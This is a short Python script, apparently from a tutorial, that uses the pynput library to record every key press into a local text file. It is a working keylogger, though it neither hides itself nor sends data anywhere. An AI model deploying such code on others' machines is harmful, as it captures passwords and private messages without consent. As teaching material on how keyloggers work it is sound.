import pynput # pip install pynput==1.6.8
from pynput.keyboard import Key, Listener # imports keyboard

with open('KeyStrokes.txt', 'w') as file: # wipes data on each program run
    file.write("--- New Session Started ---\n")

def keyPress(key): # takes key as argument
    with open('KeyStrokes.txt', 'a') as file: # creates a new file in append mode
        file.write(str(key)+'\n') # writes the string key stroke into that file and after every key stroke make new line



# similar to thread listens to key stroke
# on press of key runs function keyPress
with Listener(on_press=keyPress) as listener:
    listener.join()

#https://www.youtube.com/watch?v=2qea2kd226A&list=PL8KnQ7ULK8egs86oy1gRRa21CGDrEefPw&index=5&pp=iAQB
